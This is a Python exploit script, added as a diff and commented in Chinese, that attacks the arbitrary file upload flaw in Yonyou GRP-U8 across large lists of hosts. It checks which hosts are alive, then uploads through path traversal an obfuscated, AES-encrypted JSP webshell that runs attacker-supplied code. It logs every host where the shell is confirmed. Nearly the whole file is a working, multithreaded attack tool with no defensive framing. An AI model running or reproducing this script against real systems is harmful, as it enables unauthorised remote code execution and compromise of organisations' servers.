@@ -1,0 +1,146 @@
+#!/usr/bin/env python3
+# _*_ coding:utf-8 _*_
+# Author : Noth
+# Target : 用友 GRP-U8 任意檔案上傳漏洞
+
+import os
+import requests
+from tqdm import tqdm
+from concurrent.futures import ThreadPoolExecutor
+from urllib.parse import urljoin
+from threading import Lock
+
+# 設定執行緒數
+MAX_THREADS = 64
+
+# 成功列表與鎖
+alive_urls = []
+url_lock = Lock()
+
+# 目標檔案（可自行修改）
+url_file_path = 'C:\\Users\\Joker\\Desktop\\giwawatool\\X-Fofa\\result.txt'
+success_upload_file = 'C:\\Users\\Joker\\Desktop\\PoC\\用友GRP-U8\\result-success_upload.txt'
+
+# WebShell JSP 內容（Behinder AES 加密後門）
+webshell_content = '''Hello Administrator!
+WelCome To Tas9er JSP Console!<%@page import="sun.misc.*,javax.crypto.Cipher,javax.crypto.spec.SecretKeySpec,java.util.Random" %>
+<%!
+    class govBC8qC2 extends \u0043l\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072 {
+        govBC8qC2(\u0043l\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072 govtIREBJn1kuq) {
+            super(govtIREBJn1kuq);
+        }
+        public Class govRKqPY(byte[] govxL) {
+            return super.defineClass(govxL,0,govxL.length);
+        }
+    }
+%><%
+    out.println("Random Garbage Data:");
+    Random govQ5SUq7xqr = new Random();
+    int govZEXUeIN = govQ5SUq7xqr.nextInt(1234);
+    int govgbPb0NznB4LTjec = govQ5SUq7xqr.nextInt(5678);
+    int govV7YX2Ls = govQ5SUq7xqr.nextInt(1357);
+    int govN8e = govQ5SUq7xqr.nextInt(2468);
+    out.println(govZEXUeIN+","+govgbPb0NznB4LTjec+","+govV7YX2Ls+","+govN8e);
+    String[] govp8i = new String[]{"A", "P", "B", "O", "C", "S", "D", "T"};
+    String gov1G0O3FDa = govp8i[1] + govp8i[3] + govp8i[5] + govp8i[7];
+    if (request.getMethod().equals(gov1G0O3FDa)) {
+        String goviBUGaJMxiZTkFa = new String(new BASE64Decoder().decodeBuffer("MTZhY2FjYzA1YWFmYWY2Nw=="));
+        session.setAttribute("u", goviBUGaJMxiZTkFa);
+        Cipher govoamCA = Cipher.getInstance("AES");
+        govoamCA.init(((govZEXUeIN * govgbPb0NznB4LTjec + govV7YX2Ls - govN8e) * 0) + 3 - 1, new SecretKeySpec(goviBUGaJMxiZTkFa.getBytes(), "AES"));
+        new govBC8qC2(this.getClass().getClassLoader()).govRKqPY(govoamCA.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
+    }
+%>'''
+
+# Multipart 邊界
+boundary = '----WebKitFormBoundary92pUawKc'
+
+# Headers 模板
+headers = {
+    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'zh-CN,zh;q=0.9',
+    'Upgrade-Insecure-Requests': '1',
+    'Cookie': 'JSESSIONID=59227D2C93FE3E8C2626DA625CE710F9',
+    'Content-Type': f'multipart/form-data; boundary={boundary[2:]}'
+}
+
+# 上傳資料體
+payload_data = (
+    f'{boundary}\r\n'
+    'Content-Disposition: form-data; name="myFile";filename="test.jpg"\r\n\r\n'
+    f'{webshell_content}\r\n'
+    f'{boundary}--\r\n'
+).encode()
+
+# 上傳路徑（固定參數與目錄穿越）
+upload_path = (
+    "/UploadFileData?action=upload_file"
+    + "&" + "&".join(["1=1"] * 30)
+    + "&foldername=../"
+    + "&filename=debugg.jsp"
+    + "&filename=1.jpg"
+)
+
+# 存活檢測
+def check_alive(url):
+    try:
+        res = requests.get(url, timeout=4)
+        if res.status_code == 200:
+            with url_lock:
+                alive_urls.append(url)
+            print(f"[200] {url}")
+    except requests.RequestException:
+        pass
+
+# 發送 PoC 並驗證 WebShell 落地
+def exploit(url):
+    if not url.startswith("http"):
+        url = "http://" + url
+    try:
+        full_upload_url = urljoin(url, upload_path)
+        res = requests.post(full_upload_url, headers=headers, data=payload_data, timeout=10)
+
+        # WebShell 檢查路徑
+        shell_url = urljoin(url, "/R9iPortal/debugg.jsp")
+        verify = requests.get(shell_url, timeout=6)
+
+        if 'Hello Administrator!' in verify.text:
+            with open(success_upload_file, 'a') as f:
+                f.write(shell_url + '\n')
+            print(f"[+] 成功上傳 WebShell: {shell_url}")
+        else:
+            print(f"[-] 無回顯（可能失敗）: {url}")
+
+    except Exception as e:
+        print(f"[!] 發送失敗：{url} | {str(e)}")
+
+# 主流程
+def main():
+    try:
+        with open(url_file_path, 'r') as f:
+            targets = [line.strip() for line in f if line.strip()]
+        print(f"[+] 載入 URL 數量：{len(targets)}")
+
+        # 檢查 200 OK
+        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
+            list(tqdm(executor.map(check_alive, targets), total=len(targets), desc="檢查存活"))
+
+        if not alive_urls:
+            print("[-] 無可用 URL")
+            return
+
+        print(f"[+] 檢測成功 {len(alive_urls)} 個目標，開始發送 PoC...")
+
+        # 發送 Exploit
+        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
+            list(tqdm(executor.map(exploit, alive_urls), total=len(alive_urls), desc="送出漏洞封包"))
+
+        print(f"[+] 完成，成功結果已寫入：{success_upload_file}")
+
+    except Exception as e:
+        print(f"[!] 主程序錯誤: {e}")
+
+if __name__ == '__main__':
+    main()
